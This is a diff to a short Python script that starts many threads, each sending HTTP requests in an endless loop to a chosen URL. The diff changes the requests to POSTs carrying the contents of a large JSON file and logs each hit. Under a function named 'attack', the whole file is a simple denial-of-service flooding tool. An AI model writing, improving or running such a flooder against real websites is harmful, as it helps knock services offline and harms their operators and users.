@@ -1,12 +1,19 @@
 import threading
 import requests
+import json
+import datetime
 
 url1 = ""
 
+f = open("large.json", "r")
+json_data = json.dumps(str(f.readlines()))
+f.close()
+
 def do_request():
     while True:
-        response = requests.get(url1).text
-        print(response)
+        requests.post(url1, json_data)
+        print('Request directed at: ' + url1 + '. Time: ' + str(datetime.datetime.now()))
+
         
 
 def attack(threadcount, urlname):
@@ -29,3 +36,5 @@ def attack(threadcount, urlname):
 
     for i in range(threadcount):
         threads[i].join()
+
+f.close()
